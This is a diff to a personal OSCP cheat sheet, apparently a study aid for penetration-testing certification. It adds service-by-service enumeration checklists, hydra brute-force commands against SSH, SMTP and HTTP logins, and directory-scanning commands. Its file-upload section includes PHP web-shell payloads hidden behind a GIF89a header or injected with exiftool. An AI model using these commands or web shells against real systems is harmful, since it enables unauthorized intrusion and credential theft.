@@ -8,7 +8,17 @@ c1inton's OSCP CheatSheet.
     - [25-SMTP](#25-smtp)
     - [53-DNS](#53-dns)
     - [80/443-HTTP(S)](#80443-https)
+      - [Web Enumration](#web-enumeration)
+      - [SQL Injection](#sql-injection)
+      - [No-SQL Injection](#no-sql-injection)
+      - [XML External Entities (XXE)](#xml-external-entities-xxe)
+      - [Cross-site Scripting (XSS)](#cross-site-scripting-xss)
+      - [File Inclusion (LFI/RFI)](#file-inclusion-lfirfi)
+      - [Server-side Request forgery (SSRF)](#server-side-request-forgery-ssrf)
+      - [File Upload](#file-upload)
+    - [88-KERBEROS](#88-kerberos)
     - [110-POP3](#110-pop3)
+    - [111-NFS/RPC](#111-nfsrpc)
   - [Linux Privilege Escalation](#linux-privilege-escalation)
   - [Windows Privilege Escalation](#windows-privilege-escalatio)
   - [Useful Commands](#useful-commands)
@@ -48,12 +58,124 @@ hydra -l gibson -P /tmp/alpha.txt -T 20 $ip ssh
 /home/user/.ssh/authorized_keys
 ```
 ### 25-SMTP
+- [ ] Check for user enumeration
+- [ ] Check version for exploits
+- [ ] Check for null sessions
+```bash
+telnet $ip 25
 
-### 53-DNS
+#Enumeration
+smtp-user-enum -M VRFY -U /usr/share/wordlists/metasploit/unix_users.txt -t $ip
 
+#Brute force
+hydra -P /usr/share/wordlistsnmap.lst $ip smtp -V
+```
 ### 80/443-HTTP(S)
+- [ ] Login portals 
+    - [ ] try the default credentials off the application
+    - [ ] try usernames already seen throughout the application or in other services like SMTP
+    - [ ] try SQL injection bypasses
+    - [ ] try registering a new user
+    - [ ] brute force with hydra, medusa, ...
+- [ ] Inspect page content, HTTP header, ...
+- [ ] Check robots.txt for hidden directories
+- [ ] Brute force directories to find hidden content
+- [ ] Check for passwords/URLs/versions/... in comments of web app
+- [ ] Check version numbers for known exploits
+    - [ ] Check changelog for version information
+    - [ ] Estimate version based on copyright date (if not automatically adjusted)
+- [ ] Check if specific CMS is used like WordPress and then use platform specific scanners 
+- [ ] ways to RCE 
+  - [ ] check for file upload functionalities (if uploads are filtered, try alternative extensions)
+  - [ ] execute commands through SQLi 
+  - [ ] Shellshock
+  - [ ] command injection
+  - [ ] trigger injected code through path traversal
 
+#### Web Enumeration
+```bash
+#Brute force directory
+gobuster dir -w /usr/share/seclists/Discovery/Web-Content/common.txt -x php,txt,asp,aspx -u $url
+dirb $url -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt  
+
+#Extension set
+sh,txt,php,html,htm,asp,aspx,js,xml,log,json,jpg,jpeg,png,gif,doc,pdf,mpg,mp3,zip,tar.gz,tar
+ext~,ext.bak,ext.tmp,ext.old,bak,tmp,old
+
+#Brute force login
+hydra -L username.txt -P password.txt -f $ip http-get /manager/html -vV -u
+hydra $ip http-post-form "/admin.php:target=auth&mode=login&user=^USER^&password=^PASS^:invalid" -P /usr/share/wordlists/rockyou.txt -l admin
+
+#Webdav
+davtest --url $url
+
+#CMS Scanner
+wpscan --url $ip/wp/
+droopescan scan drupal -u $url -t 32
+joomscan -u $ip
+```
+#### SQL injection
+
+#### No-SQL injection
+
+#### XML External Entities (XXE)
+
+#### Cross-site Scripting (XSS)
+#### File Inclusion (LFI/RFI)
+```bash
+
+
+#Payload all the things
+https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion
+```
+#### Server-side Request forgery (SSRF)
+```bash
+
+
+#Payload all the things
+
+```
+
+#### File Upload
+```bash
+#Extension set
+php - phtml, .php, .php3, .php4, .php5, .Php, .pHp, phP, .php.jpg and .inc
+asp - asp, .aspx
+perl - .pl, .pm, .cgi, .lib
+jsp - .jsp, .jspx, .jsw, .jsv, and .jspf
+Coldfusion - .cfm, .cfml, .cfc, .dbm
+
+#GIF89a
+GIF89a;            
+<?            
+system($_GET['cmd']);//or you can insert your complete shell code            
+?>
+
+#Exiftool
+exiftool -Comment='<?php echo "<pre>"; system($_GET['cmd']); ?>'
+
+#Payload all the things
+https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files
+```
+### 88-KERBEROS
+```bash
+https://www.tarlogic.com/en/blog/how-to-attack-kerberos/
+```
 ### 110-POP3
+- [ ] Check version for exploits
+- [ ] Check mails for the presence of credentials
+```bash
+telnet $ip 110
+list
+retr $number
+```
+
+### 111-NFS/RPC
+- [ ] Check for passwords in files on mountable drives
+```bash
+rpcinfo -p $ip
+showmount -e $ip
+```
 
 ## Linux Privilege Escalation
 
@@ -68,6 +190,10 @@ hydra -l gibson -P /tmp/alpha.txt -T 20 $ip ssh
 
 ## Buffer Overflow
 
+windows kernel exploits
+https://github.com/SecWiki/windows-kernel-exploits
+
+export PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
 
 ```python
 #test
